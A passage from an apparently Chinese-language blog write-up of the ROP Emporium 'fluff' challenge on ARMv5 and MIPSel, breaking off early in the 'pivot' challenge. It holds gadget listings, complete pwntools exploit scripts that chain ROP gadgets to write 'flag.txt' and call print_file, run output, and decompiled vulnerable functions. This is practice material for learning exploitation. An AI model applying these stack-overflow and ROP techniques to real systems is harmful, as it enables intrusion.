<p>发现在<code>0x000103ea</code>和<code>0x000103e8</code>处存在 <strong>str</strong> 指令，且较为简单，因此可以使用<code>000105F0</code>处的 <strong>bx</strong> 指令跳转到 <strong>str</strong> 指令地址处，进行数据写入，由于 <strong>str r6, [r5, #0x44]</strong> 指令使用了 <em>r6</em>，<em>r5</em> 两个寄存器，因此需要找到指令将数据写入 <em>r6</em>，<em>r5</em> 两个寄存器，再次搜索arm指令，结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary fluff_armv5 --only <span class="string">&quot;pop&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000105cc : pop &#123;fp, pc&#125;</span><br><span class="line">0x00010474 : pop &#123;r3, pc&#125;</span><br><span class="line">0x000105ac : pop &#123;r4, pc&#125;</span><br><span class="line">0x00010658 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>
<p>可以使用<code>0x00010658</code>处的 <strong>pop</strong> 指令将数据写入 <em>r5</em>，<em>r6</em> 寄存器，其中r5写入地址，r6写入字符串，同时向pc寄存器中写入<code>0x000105EC</code>，以便后续跳转到thumb指令中。综上，使用<code>0x000105EC</code>，<code>0x000103ea</code>，<code>0x00010658</code>构造pop链，将<code>flag.txt</code>字符串写入data段内，再调用print_file函数，即可获取flag。</p>
<h4 id="编写exp">编写exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-arm&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./fluff_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pop_r0_r1_r3_bx_r1 = <span class="number">0x000105EC</span>         <span class="comment"># POP &#123;R0,R1,R3&#125;; BX R1</span></span><br><span class="line">pop_r4_r10_pc = <span class="number">0x00010658</span>              <span class="comment"># pop &#123;R4-R10,PC&#125;</span></span><br><span class="line">str_r6_r5_0x44_bx_r0 = <span class="number">0x000103ea</span>       <span class="comment"># thumb: str r6, [r5, #0x44] ; bx r0</span></span><br><span class="line"></span><br><span class="line">data_addr = <span class="number">0x00021024</span></span><br><span class="line">print_file = <span class="number">0x000104B0</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x24</span>)</span><br><span class="line">payload += p32(pop_r4_r10_pc)				<span class="comment"># 覆盖返回地址，以便将数据写入r5，r6寄存器</span></span><br><span class="line">payload += <span class="string">b&quot;BBBB&quot;</span>							<span class="comment"># pop r4</span></span><br><span class="line">payload += p32(data_addr-<span class="number">0x44</span>)				<span class="comment"># pop r5，因为str r6, [r5, #0x44]指令中目的地址为r5+0x44，所以此处减去0x44</span></span><br><span class="line">payload += <span class="string">b&quot;flag&quot;</span>							<span class="comment"># pop r6</span></span><br><span class="line">payload += <span class="string">b&quot;CCCC&quot;</span> * <span class="number">4</span>						<span class="comment"># pop r7-r10</span></span><br><span class="line"></span><br><span class="line">payload += p32(pop_r0_r1_r3_bx_r1)			<span class="comment"># pop pc，当pop &#123;R4-R10,PC&#125;执行完毕后，跳转到0x000105EC处开始执行</span></span><br><span class="line">payload += p32(pop_r4_r10_pc)               <span class="comment"># pop r0，为后续str r6, [r5, #0x44] ; bx r0执行后，返回跳转到0x00010658处做准备</span></span><br><span class="line">payload += p32(str_r6_r5_0x44_bx_r0+<span class="number">1</span>)      <span class="comment"># pop r1，当POP &#123;R0,R1,R3&#125;; BX R1执行完毕后，跳转到0x000103ea处开始执行thumb指令</span></span><br><span class="line">payload += <span class="string">b&quot;DDDD&quot;</span>							<span class="comment"># pop r3</span></span><br><span class="line">payload += <span class="string">b&quot;DDDD&quot;</span>                      	<span class="comment"># pop r4，当bx r0执行返回后，执行pop &#123;R4-R10,PC&#125;，该处用于弹出到r4寄存器</span></span><br><span class="line">payload += p32(data_addr+<span class="number">4</span>-<span class="number">0x44</span>)            <span class="comment"># pop r5，data段地址+4-0x44</span></span><br><span class="line">payload += <span class="string">b&quot;.txt&quot;</span>                          <span class="comment"># pop r6</span></span><br><span class="line">payload += <span class="string">b&quot;CCCC&quot;</span> * <span class="number">4</span>						<span class="comment"># pop r7-r10</span></span><br><span class="line"></span><br><span class="line">payload += p32(pop_r0_r1_r3_bx_r1)			<span class="comment"># pop pc，当pop &#123;R4-R10,PC&#125;执行完毕后，跳转到0x000105EC处开始执行</span></span><br><span class="line">payload += p32(pop_r0_r1_r3_bx_r1)          <span class="comment"># pop r0，为后续str r6, [r5, #0x44] ; bx r0执行后，返回跳转到0x000105EC处做准备</span></span><br><span class="line">payload += p32(str_r6_r5_0x44_bx_r0 + <span class="number">1</span>)    <span class="comment"># pop r1，当POP &#123;R0,R1,R3&#125;; BX R1执行完毕后，跳转到0x000103ea处开始执行thumb指令</span></span><br><span class="line">payload += <span class="string">b&quot;EEEE&quot;</span>                          <span class="comment"># pop r3</span></span><br><span class="line">payload += p32(data_addr)					<span class="comment"># pop r0，当bx r0执行返回后，执行POP &#123;R0,R1,R3&#125;; BX R1，弹出data段地址到r0，作为print_file函数的参数</span></span><br><span class="line">payload += p32(print_file)					<span class="comment"># pop r1, 将跳转到print_file函数</span></span><br><span class="line">payload += <span class="string">b&quot;FFFF&quot;</span>							<span class="comment"># pop r3</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>bx指令会判断目的地址最低位是否为1，若为1，则将目的地址处视为thumb指令，否则视为arm指令。</p>
</blockquote>
<h4 id="运行结果">运行结果</h4>
<p>exp运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;/usr/bin/qemu-arm&#x27;</span>: pid 3100</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">fluff by ROP Emporium</span><br><span class="line">ARMv5</span><br><span class="line"></span><br><span class="line">You know changing these strings means I have to rewrite my solutions...</span><br><span class="line">&gt; Thank you!</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
<blockquote>
<p>armv5-hf和armv5类似，不过其thumb指令仅能利用 <strong>strh</strong> 指令，每次只能填充2个字节，共需4次才能写入<code>flag.txt</code>字符串。</p>
</blockquote>
<h3 id="mipsel">mipsel</h3>
<h4 id="分析-1">分析</h4>
<p>在IDA中直接查看可利用的gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:00400930                               questionableGadgets:                     # gadget1 $s1=0 </span><br><span class="line">.text:00400930 08 00 B9 8F                   lw      $t9, 8($sp)</span><br><span class="line">.text:00400934 04 00 AC 8F                   lw      $t4, 4($sp)</span><br><span class="line">.text:00400938 26 88 31 02                   xor     $s1, $s1</span><br><span class="line">.text:0040093C 41 00 04 3C 70 2C 84 34       li      $a0, 0x412C70</span><br><span class="line">.text:00400944 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400948 0C 00 BD 23                   addi    $sp, 0xC</span><br><span class="line">.text:00400948</span><br><span class="line">.text:0040094C 08 00 B9 8F                   lw      $t9, 8($sp)                      # gadget2 $s2 = 4($sp)</span><br><span class="line">.text:00400950 04 00 B2 8F                   lw      $s2, 4($sp)</span><br><span class="line">.text:00400954 41 00 0C 3C 74 2C 8C 35       li      $t4, 0x412C74</span><br><span class="line">.text:0040095C 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400960 0C 00 BD 23                   addi    $sp, 0xC</span><br><span class="line">.text:00400960</span><br><span class="line">.text:00400964 04 00 B9 8F                   lw      $t9, 4($sp)                      # gadget3 xor $s1, $s2</span><br><span class="line">.text:00400968 26 88 32 02                   xor     $s1, $s2</span><br><span class="line">.text:0040096C 41 00 05 3C 00 15 A5 34       li      $a1, 0x411500</span><br><span class="line">.text:00400974 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400978 08 00 BD 23                   addi    $sp, 8</span><br><span class="line">.text:00400978</span><br><span class="line">.text:0040097C 04 00 B9 8F                   lw      $t9, 4($sp)                      # gadget4 swap($s0, $s1)</span><br><span class="line">.text:00400980 26 80 11 02                   xor     $s0, $s1</span><br><span class="line">.text:00400984 26 88 11 02                   xor     $s1, $s0, $s1</span><br><span class="line">.text:00400988 26 80 11 02                   xor     $s0, $s1</span><br><span class="line">.text:0040098C 41 00 0D 3C 04 15 AD 35       li      $t5, 0x411504</span><br><span class="line">.text:00400994 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:00400998 08 00 BD 23                   addi    $sp, 8</span><br><span class="line">.text:00400998</span><br><span class="line">.text:0040099C 04 00 B9 8F                   lw      $t9, 4($sp)                      # gadget5 sw $s1, ($s0)</span><br><span class="line">.text:004009A0 00 00 11 AE                   sw      $s1, 0($s0)</span><br><span class="line">.text:004009A4 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:004009A8 08 00 BD 23                   addi    $sp, 8</span><br><span class="line">.text:004009A8</span><br><span class="line">.text:004009AC 08 00 A4 8F                   lw      $a0, 8($sp)</span><br><span class="line">.text:004009B0 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class="line">.text:004009B4 09 F8 20 03                   jalr    $t9</span><br><span class="line">.text:004009B8 0C 00 BD 23                   addi    $sp, 0xC</span><br></pre></td></tr></table></figure>
<p>可以看到上述的gadget主要是对<em>s1</em>，<em>s2</em>，<em>s0</em> 寄存器进行操作，因此需要设计好gadget对完成对data段内写入数据。</p>
<p>首先从<code>0040099C</code>处的 <strong>sw $s1, 0($s0)</strong> 指令开始分析，该指令将 <em>s1</em> 寄存器值写入 <em>s0</em> 寄存器值指向的地址处，因此需要控制写入 <em>s0</em> 和 <em>s1</em> 的数据，但gadget中没有直接写入<em>s0</em> 和 <em>s1</em>的指令，只有对 <em>s1</em> 赋值为0和交换<em>s0</em>、<em>s1值</em>的操作，但同时有对 <em>s2</em> 写入数据和 <em>s1</em>、<em>s2</em> 互相异或的操作，因此需要考虑如何利用对 <em>s2</em> 写入数据和 <em>s1</em>、<em>s2</em> 互相异或的操作实现对 <em>s0</em> 和 <em>s1</em> 写入数据。整体步骤如下：</p>
<ol type="1">
<li>思考如何通过<code>xor $s1, $s2</code>，<code>$s1=0</code>，<code>$s2 = 4($sp)</code> 对 <em>s1</em> 写入数据，先使用gadget1对 <em>s1</em> 赋值为0，然后使用gadget2对 <em>s2</em> 赋值为相应数据，再通过gadget3异或操作实现对 <em>s1</em> 的数据写入。</li>
<li>思考如何对 <em>s0</em> 写入数据，先通过步骤1实现对 <em>s1</em> 写入数据，再利用gadget4进行swap实现对 <em>s0</em> 数据写入。</li>
<li>思考如何向data段内写入数据，先利用步骤1，2实现对 <em>s0</em> 写入字符，再利用步骤1实现对 <em>s1</em> 写入地址，然后利用gadget4交换 <em>s1</em> 和 <em>s2</em> 的值，此时 <em>s1</em> 值为字符，<em>s0</em> 值为地址，最后利用gadget5实现data段内写入字符。</li>
<li>重复步骤1-3，再次写入剩余的字符，最后利用<code>0x004009AC</code>处gadget跳转到print_file函数。</li>
</ol>
<h4 id="编写exp-1">编写exp</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-mipsel&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class="string">&#x27;./fluff_mipsel&#x27;</span>])</span><br><span class="line"></span><br><span class="line">mov_s1_0 = <span class="number">0x00400930</span></span><br><span class="line">lw_t9_s2_jr_t9 = <span class="number">0x0040094c</span></span><br><span class="line">xor_s1_s2 = <span class="number">0x00400964</span></span><br><span class="line">sawp_s0_s1 = <span class="number">0x0040097C</span></span><br><span class="line">lw_t9_sw_s1_s0_jr_t9 = <span class="number">0x0040099C</span></span><br><span class="line">lw_a0_t9_jalr_t9 = <span class="number">0x004009AC</span></span><br><span class="line">print_file = <span class="number">0x00400AF0</span></span><br><span class="line">data_addr = <span class="number">0x00411000</span></span><br><span class="line">s = <span class="string">b&quot;flag.txt&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x24</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    payload += p32(mov_s1_0)        <span class="comment"># s1 = 0</span></span><br><span class="line">    payload += <span class="string">b&quot;BBBB&quot;</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    payload += p32(lw_t9_s2_jr_t9)  <span class="comment"># s2 = flag</span></span><br><span class="line">    payload += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">    payload += s[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    payload += p32(xor_s1_s2)       <span class="comment"># s1 = flag</span></span><br><span class="line">    payload += <span class="string">b&quot;DDDD&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += p32(sawp_s0_s1)      <span class="comment"># s0 = flag</span></span><br><span class="line">    payload += <span class="string">b&quot;EEEE&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += p32(mov_s1_0)        <span class="comment"># s1 = 0</span></span><br><span class="line">    payload += <span class="string">b&quot;BBBB&quot;</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    payload += p32(lw_t9_s2_jr_t9)  <span class="comment"># s2 = data_addr</span></span><br><span class="line">    payload += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">    payload += p32(data_addr + i * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    payload += p32(xor_s1_s2)       <span class="comment"># s1 = data_addr</span></span><br><span class="line">    payload += <span class="string">b&quot;DDDD&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += p32(sawp_s0_s1)      <span class="comment"># s1 = flag, s0 = data_addr</span></span><br><span class="line">    payload += <span class="string">b&quot;EEEE&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += p32(lw_t9_sw_s1_s0_jr_t9)</span><br><span class="line">    payload += <span class="string">b&quot;FFFF&quot;</span></span><br><span class="line"></span><br><span class="line">payload += p32(lw_a0_t9_jalr_t9)</span><br><span class="line">payload += <span class="string">b&quot;EEEE&quot;</span></span><br><span class="line">payload += p32(print_file)</span><br><span class="line">payload += p32(data_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="运行结果-1">运行结果</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python exp.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;/usr/bin/qemu-mipsel&#x27;</span>: pid 3616</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">fluff by ROP Emporium</span><br><span class="line">MIPS</span><br><span class="line"></span><br><span class="line">You know changing these strings means I have to rewrite my solutions...</span><br><span class="line">&gt; Thank you!</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br></pre></td></tr></table></figure>
<h4 id="非预期解">非预期解</h4>
<p>由于含有直接写入s1和s0的gadget，可以借助该gadget对s1和s0写入合适数据，然后再调用print_file函数，这里只给出exp，利用原理和<a href="/2022/09/27/rop-emporium/" title="rop emporium">ROP Emporium</a>中的write4一样，不再进行详细讲解。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-mipsel&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class="string">&#x27;./fluff_mipsel&#x27;</span>])</span><br><span class="line"></span><br><span class="line">lw_ra_s1_s0_jr_ra = <span class="number">0x00400aac</span></span><br><span class="line">lw_t9_sw_s1_s0_jr_t9 = <span class="number">0x0040099C</span></span><br><span class="line">lw_a0_t9_jalr_t9 = <span class="number">0x004009AC</span></span><br><span class="line">print_file = <span class="number">0x00400AF0</span></span><br><span class="line">data_addr = <span class="number">0x00411000</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x24</span>)</span><br><span class="line">payload += p32(lw_ra_s1_s0_jr_ra)</span><br><span class="line">payload += <span class="string">b&quot;BBBB&quot;</span> * <span class="number">7</span></span><br><span class="line">payload += p32(data_addr)</span><br><span class="line">payload += <span class="string">b&quot;flag&quot;</span></span><br><span class="line">payload += p32(lw_t9_sw_s1_s0_jr_t9)</span><br><span class="line">payload += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">payload += p32(lw_ra_s1_s0_jr_ra)</span><br><span class="line">payload += <span class="string">b&quot;DDDD&quot;</span> * <span class="number">7</span></span><br><span class="line">payload += p32(data_addr+<span class="number">4</span>)</span><br><span class="line">payload += <span class="string">b&quot;.txt&quot;</span></span><br><span class="line">payload += p32(lw_t9_sw_s1_s0_jr_t9)</span><br><span class="line">payload += <span class="string">b&quot;CCCC&quot;</span></span><br><span class="line">payload += p32(lw_a0_t9_jalr_t9)</span><br><span class="line">payload += <span class="string">b&quot;EEEE&quot;</span></span><br><span class="line">payload += p32(print_file)</span><br><span class="line">payload += p32(data_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="pivot">pivot</h2>
<p>此类型题的考点在于如果栈溢出空间不够，如何进行栈迁移使得能够继续构造pop链。</p>
<h3 id="x86和x64-1">x86和x64</h3>
<ol type="1">
<li><p>x86</p>
<h4 id="分析-2">分析</h4>
<p>首先查看关键漏洞函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">pwnme</span><span class="params">(<span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Call ret2win() from libpivot&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Send a ROP chain now and it will land there&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now please send your stack smash&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pivot by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86\n&quot;</span>);</span><br><span class="line">  ptr = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000000</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to request space for pivot stack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  pwnme(ptr + <span class="number">16776960</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现程序进行了两次读取数据，第1次读取0x100个字节到动态分配的空间上(结合main函数可以看出)，第2次读取0x38个字节到数组s上，而数组s空间大小为0x28，因此栈只能溢出0x10个字节，没有足够空间构造pop链，需要进行栈迁移。</p>
<p>而<code>pivot32</code>中没有后门函数，查看<code>libpivot32.so</code>，发现该文件中存在后门函数<code>ret2win</code>，但是该函数没有导入到<code>pivot32</code>中，因此无法直接利用。同时查看到该文件中的<code>foothold_function</code>函数提示 <strong>Check out my .got.plt entry to gain a foothold into libpivot</strong>，因此想到需要利用<code>foothold .got.plt表项</code>泄露出foothold的真实地址，添加上ret2win函数与foothold_function函数的偏移即可以泄露出ret2win的真实地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">ret2win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+Bh] [ebp-2Dh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to open file: flag.txt&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(&amp;s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span 